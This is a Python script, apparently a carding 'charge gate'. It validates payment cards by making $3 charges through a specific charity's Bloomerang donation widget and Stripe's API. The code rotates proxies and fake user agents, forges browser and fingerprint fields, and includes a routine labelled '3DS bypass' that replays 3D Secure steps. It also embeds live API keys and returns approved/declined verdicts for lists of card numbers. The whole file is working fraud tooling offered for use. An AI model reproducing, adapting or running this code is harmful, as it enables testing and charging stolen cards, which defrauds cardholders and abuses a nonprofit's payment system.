# ============================================================
#  CHG3 — Stripe $3 Charge via Bloomerang (quincyfamilyrc.org)
#  Charge gate with 3DS bypass: confirms payment_intent
# ============================================================

import requests
import json
import random
import string
import secrets
import uuid
import time
from datetime import datetime
from urllib.parse import quote_plus
from typing import Optional, Dict

try:
    from faker import Faker
except ImportError:
    Faker = None

try:
    from fake_useragent import UserAgent
except ImportError:
    UserAgent = None


def _gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""


APIKEY = "pk_live_iZYXFefCkt380zu63aqUIo7y"


def _process(cc, mm, yy, cvv, proxy_dict=None):
    ses = requests.Session()
    if proxy_dict:
        ses.proxies.update(proxy_dict)

    if UserAgent:
        ua = UserAgent(platforms='mobile')
        useragents = ua.random
    else:
        useragents = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36'

    fake = Faker("en_US") if Faker else None
    zipcode = "10001"
    if fake:
        try:
            zipcode = fake.zipcode()
        except Exception:
            try:
                zipcode = fake.postcode()
            except Exception:
                pass

    mm = mm.zfill(2)
    yy = yy[-2:].zfill(2)
    cvv = cvv[:4]

    # 1. Create widget session (get PI + client secret)
    widget_headers = {
        'accept': '*/*',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://www.quincyfamilyrc.org',
        'referer': 'https://www.quincyfamilyrc.org/',
        'user-agent': useragents,
    }
    widget_json = {
        'ServedSecurely': True,
        'FormUrl': 'https://www.quincyfamilyrc.org/donate/',
        'Logs': [],
    }
    r = ses.post('https://api.bloomerang.co/v1/Widget/3729409',
                 params={'ApiKey': 'pub_fa6f55a1-d391-11eb-ab84-0253c981a9f9'},
                 headers=widget_headers, json=widget_json, timeout=25, verify=False)
    txt = r.text
    pi_ = _gstr(txt, 'PaymentIntentId":"', '"')
    ClientSecret = _gstr(txt, 'ClientSecret":"', '"')
    StripeAccountId = _gstr(txt, 'StripeAccountId":"', '"')

    if not pi_ or not ClientSecret:
        return None, "Failed to create payment session"

    # 2. Confirm payment intent
    stripe_h = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': useragents,
    }
    confirm_data = {
        "return_url": "https://www.quincyfamilyrc.org/donate/",
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": cc,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[billing_details][address][country]": "US",
        "payment_method_data[billing_details][address][postal_code]": zipcode,
        "payment_method_data[allow_redisplay]": "unspecified",
        "payment_method_data[pasted_fields]": "number,cvc",
        "payment_method_data[payment_user_agent]": "stripe.js/94528a98b2; stripe-js-v3/94528a98b2; payment-element",
        "payment_method_data[referrer]": "https://www.quincyfamilyrc.org",
        "payment_method_data[time_on_page]": str(random.randint(30000, 120000)),
        "payment_method_data[guid]": str(uuid.uuid4()),
        "payment_method_data[muid]": str(uuid.uuid4()),
        "payment_method_data[sid]": str(uuid.uuid4()),
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": APIKEY,
        "client_secret": ClientSecret,
    }
    r = ses.post(f'https://api.stripe.com/v1/payment_intents/{pi_}/confirm',
                 headers=stripe_h, data=confirm_data, timeout=25, verify=False)
    response_text = r.text

    try:
        resp = json.loads(response_text)
    except Exception:
        resp = {}

    err = resp.get("error") or {}
    last = ((err.get("payment_intent") or {}).get("last_payment_error") or {})
    status = _gstr(response_text, '"status": "', '"') or _gstr(response_text, '"status":"', '"')

    decline_code = (
        last.get("decline_code") or last.get("code") or
        err.get("decline_code") or err.get("code")
    )
    message = last.get("message") or err.get("message")

    if decline_code:
        return False, f"{decline_code}: {message or 'Declined'}"

    if status == "succeeded":
        return True, "Charged $3"

    if status == "requires_action":
        # 3DS bypass attempt
        three_d_source = resp.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')
        if not three_d_source:
            return False, "3DS Required (no source)"

        # Fingerprint step
        fp_h = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://geoissuer.cardinalcommerce.com',
            'referer': 'https://geoissuer.cardinalcommerce.com/',
            'user-agent': useragents,
        }
        fp_data = {
            'threeDSMethodData': 'eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImMxMmU5NmRhLWY0OWUtNDc1Yi05NzMyLTZkYWNjOTJkZTdhMCJ9',
        }
        ses.post(f'https://hooks.stripe.com/3d_secure_2/fingerprint/{StripeAccountId}/{three_d_source}',
                 headers=fp_h, data=fp_data, timeout=20, verify=False)

        # Authenticate step
        browser_data = {
            "fingerprintAttempted": True,
            "challengeWindowSize": None,
            "threeDSCompInd": "Y",
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": "en-GB",
            "browserColorDepth": "24",
            "browserScreenHeight": "1080",
            "browserScreenWidth": "1920",
            "browserTZ": "0",
            "browserUserAgent": useragents,
        }
        auth_data = (
            f'source={three_d_source}&'
            f'browser={quote_plus(json.dumps(browser_data))}&'
            f'one_click_authn_device_support[hosted]=false&'
            f'one_click_authn_device_support[same_origin_frame]=false&'
            f'one_click_authn_device_support[spc_eligible]=false&'
            f'one_click_authn_device_support[webauthn_eligible]=false&'
            f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
            f'key={APIKEY}&'
            f'_stripe_version=2024-06-20'
        )
        auth_h = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': useragents,
        }
        ses.post('https://api.stripe.com/v1/3ds2/authenticate', headers=auth_h, data=auth_data, timeout=20, verify=False)

        # Check final status
        check_params = {
            'is_stripe_sdk': 'false',
            'client_secret': ClientSecret,
            'key': APIKEY,
            '_stripe_version': '2024-06-20',
        }
        r = ses.get(f'https://api.stripe.com/v1/payment_intents/{pi_}',
                    params=check_params, headers=auth_h, timeout=20, verify=False)

        try:
            resp2 = json.loads(r.text)
        except Exception:
            resp2 = {}

        err2 = resp2.get("error") or {}
        pi_data = err2.get("payment_intent") or {}
        status2 = resp2.get("status") or err2.get("status") or _gstr(r.text, '"status":"', '"')
        last2 = pi_data.get("last_payment_error") or {}
        dc2 = last2.get("decline_code") or last2.get("code") or err2.get("decline_code") or err2.get("code")
        msg2 = last2.get("message") or err2.get("message") or "Unknown"

        if status2 == "succeeded":
            return True, "Charged $3 (3DS bypassed)"
        elif dc2:
            return False, f"{dc2}: {msg2}"
        elif status2 in ("requires_action", "requires_payment_method"):
            return False, "3DS Required"
        else:
            return None, f"Unknown status: {status2}"

    return None, "Unknown response"


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts

        for attempt in range(3):
            try:
                result, detail = _process(cc, mm, yy, cvv, proxy_dict)
                elapsed = f"{time.time() - start:.1f}s"
                if result is True:
                    return f"Approved | {detail} | {elapsed}"
                elif result is False:
                    return f"Declined | {detail} | {elapsed}"
                else:
                    if attempt < 2:
                        continue
                    return f"Error | {detail} | {elapsed}"
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout, ConnectionError, OSError):
                if attempt < 2:
                    time.sleep(0.5)
                    continue
                return f"Declined | Gateway Timeout | {time.time() - start:.1f}s"
            except Exception as e:
                return f"Error | {str(e)[:60]} | {time.time() - start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    try:
        r = requests.post('https://api.bloomerang.co/v1/Widget/3729409',
                         params={'ApiKey': 'pub_fa6f55a1-d391-11eb-ab84-0253c981a9f9'},
                         json={'ServedSecurely': True, 'FormUrl': 'https://www.quincyfamilyrc.org/donate/', 'Logs': []},
                         timeout=15, verify=False)
        if r.status_code == 200 and 'PaymentIntentId' in r.text:
            return True, "Bloomerang + Stripe active"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
